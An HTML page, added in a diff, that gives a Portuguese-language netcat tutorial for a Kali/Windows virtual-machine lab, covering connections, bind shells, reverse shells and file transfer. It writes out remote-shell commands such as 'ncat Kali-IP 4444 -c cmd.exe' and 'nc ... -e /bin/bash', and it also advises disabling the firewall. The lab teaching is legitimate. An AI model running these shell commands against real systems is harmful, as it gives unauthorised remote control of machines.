@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NETCAT</title>
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<div class="container">
+    <h1>NETCAT</h1>
+  
+<p>n = somente endereço IP numérico (sem DNS)</p>
+<p>l = ouvir por conexões de entrada</p>
+<p>v = verbose (detalhado)</p>
+<p>p = número da porta local</p>
+
+<pre>nc -nlvp 4444</pre>
+<img src="img/1.gif" width="700" height="200">
+<p>Abra um novo prompt de comando na sua VM do Windows e conecte à porta aberta na sua VM do Kali usando:</p>
+
+<pre>ncat -nv Kali-IP 4444</pre>
+<img src="img/2.gif" width="700" height="200">
+<p>A saída mostra que agora conectamos com sucesso as duas máquinas. Isso é essencialmente agora um serviço de mensagens simples onde você pode enviar mensagens entre as máquinas. Você pode ver pelas saídas abaixo que uma mensagem enviada da máquina Windows foi recebida pela máquina Kali e vice-versa.</p>
+<img src="img/3.gif" width="700" height="200">
+<p>Use Ctrl + C em qualquer uma das máquinas para fechar a conexão.</p>
+
+<h2>Windows server</h2>
+<p>Basicamente, é o mesmo método que o acima, no entanto, você usa:</p>
+
+<pre>ncat -nlvp 4444 para ouvir conexões na VM do Windows.</pre>
+<pre>nc -nv <IP-do-Windows> 4444 para se conectar a 👆 a partir da sua VM do Kali.</pre>
+<img src="img/4.gif" width="700" height="200">
+<p>Usando o netcat para escutar na porta 4444 da VM do Windows</p>
+<img src="img/5.gif" width="700" height="200">
+<p>Estabelecendo uma conexão e enviando mensagens entre as duas VMs
+</p>
+<h2>Bind shells</h2>
+
+<p>Agora que você conectou com sucesso as duas máquinas virtuais, vamos dar uma olhada nas bind shells. Para configurar uma bind shells, basicamente precisamos anexar uma shell a uma porta em uma máquina para que, quando uma conexão for estabelecida, a shell possa ser acessada na outra máquina e comandos possam ser executados.</p>
+
+<p>NOTA: Para esta etapa funcionar, você precisará acessar as configurações do firewall na VM do Windows e desativar o Firewall. Obviamente, isso não é a coisa mais segura a se fazer, então lembre-se de ligar o firewall novamente quando terminar. Se você não desativar o Firewall, não conseguirá se conectar à VM do Windows. Tente alternar as configurações do firewall durante essas tarefas para ver o que funciona e o que não funciona, ajudando a entender o que está acontecendo.</p>
+
+<h2>Windows bind shell</h2>
+
+<p>Para iniciar uma bind shell no Windows, precisamos configurar um ouvinte com o executável cmd.exe (Prompt de Comando do Windows) anexado a ele. Para especificar o arquivo a ser executado, podemos usar:</p>
+
+<p>e = programa a ser executado após a opção de conexão. Sintaxe: -e <nome do arquivo></p>
+<p>c = usar /bin/sh para executar. Sintaxe: -c <comandos de shell></p>
+<pre>ncat -nlvp 4444 -e cmd.exe</pre>
+<img src="img/6.gif" width="700" height="200">
+<p>Agora que você vinculou o shell à porta, conecte-se a ele usando:</p>
+
+<pre>nc -nv IP-do-Windows 4444</pre>
+
+<p>Assim que uma conexão for estabelecida, a VM do Kali terá acesso à shell da VM do Windows.</p>
+<img src="img/7.gif" width="700" height="200">
+<p>Você pode ver que a VM do Kali agora tem acesso à shell do Windows a partir da saída de whoami, mudando de "parallels" para "theobridgembe32/theo".</p>
+
+<h2>Kali Bind Shell</h2>
+<p>
+No Kali, o método de bind shells difere um pouco do acima, onde você usará -c /bin/bash em vez de -e cmd.exe. As opções -e e -c podem ser usadas de forma intercambiável, no entanto, acredito que esta seja a utilização correta. Eu vou misturar e combinar essas opções ao longo deste blog para mostrar que ambas funcionam. Use whoami para confirmar o shell de ligação bem-sucedido:</p>
+<img src="img/8.gif" width="700" height="200">
+
+<h2>Reverse shells</h2>
+<p>
+Um shell reverso ocorre quando a shell executável é enviada do host para a máquina que está ouvindo, em vez de ser vinculada à porta e executada após a conexão. Isso pode ser usado quando há um Firewall bloqueando uma conexão para uma bind shells e permite que a máquina atrás do firewall envie acesso à shell para a máquina que está ouvindo fora do firewall.</p>
+
+
+<h2>Windows reverse shell</h2>
+
+<pre>nc -nlvp 4444</pre>
+<p>Em seguida, conecte-se à porta de escuta e envie a shell para ela usando:</p>
+
+<pre>ncat Kali-IP 4444 -c cmd.exe</pre>
+<p>
+Da mesma forma que -c cmd.exe pode ser vinculado a uma porta, também pode ser usado de forma reversa e enviado para a máquina ouvinte, daí o termo "shell reverso". Isso significa que uma shell, mesmo estando atrás de um firewall, pode ser enviada para uma máquina externa e ser executada ao se conectar para obter acesso para executar comandos.</p>
+<img src="img/9.gif" width="700" height="200">
+<p>
+Você pode ver pela saída que uma vez que a conexão é feita, o shell reverso é executado pelo ouvinte.</p>
+
+<h2>Kali reverse shell</h2>
+
+<p>Para que isso funcione, mais uma vez você precisará desativar o firewall na VM do Windows (ou criar uma regra que permita essa conexão). Experimente com e sem o firewall para ver o que acontece.</p>
+
+<p>Configure o ouvinte no Windows:</p>
+<pre>ncat -nlvp 4444</pre>
+
+<p>Conecte-se ao ouvinte e envie o shell reverso. Novamente, em vez de usar -c cmd.exe, você precisará usar -e /bin/bash:</p>
+<pre>
+nc -nv Windows-IP 4444 -e /bin/bash
+</pre>
+<p>
+<img src="img/10.gif" width="700" height="200">
+Como você pode ver na saída, o shell reverso foi executado com sucesso na máquina receptora e a máquina virtual do Windows tem acesso à linha de comando do Kali.</p>
+
+
+<h2>File transfers</h2>
+<h2>Windows file transfer</h2>
+<p>
+Você pode usar o Netcat para transferir arquivos entre as duas VMs. Comece criando um arquivo para enviar da VM do Windows
+echo "password" > password.txt</p>
+<p>
+Configure o ouvinte do Kali e especifique onde salvar o arquivo transferido.</p>
+
+<pre>nc -nlvp 4444 > passwordWindows.txt</pre>
+<p>
+Envie o arquivo da máquina Windows usando o arquivo como entrada para a conexão.</p>
+<pre>
+ncat -nv Kali-IP 4444 < password.txt</pre>
+<p>
+Quando a conexão for estabelecida, o conteúdo do arquivo é salvo no arquivo especificado pelo ouvinte.</p>
+<p>
+<img src="img/11.gif" width="700" height="200">
+Você pode ver na saída que o arquivo foi transferido com sucesso. Na VM Kali, parece que a conexão acabou de ser encerrada, no entanto, a transferência de arquivo bem-sucedida pode ser confirmada lendo o conteúdo do arquivo transferido com a extensão cat <transferred_file>.</p>
+
+<h2>Kali file transfer</h2>
+<p>
+Isso é praticamente o mesmo que enviar arquivos da VM do Windows. A única diferença é que você precisará interromper manualmente a conexão usando Ctrl + C antes de ler o arquivo:</p>
+<p>
+<img src="img/12.gif" width="700" height="200">
+
+Como você pode ver, o processo de envio de arquivos é bastante semelhante em qualquer sistema operacional. Isso também pode ser feito ao contrário, onde o arquivo é enviado da máquina que está escutando para que a máquina que está conectando receba o arquivo. Isto é essencialmente como vincular um arquivo em vez de um shell.
+</p>
+<img src="img/13.webp" width="700" height="200">
+</div>
+
+</body>
+</html>
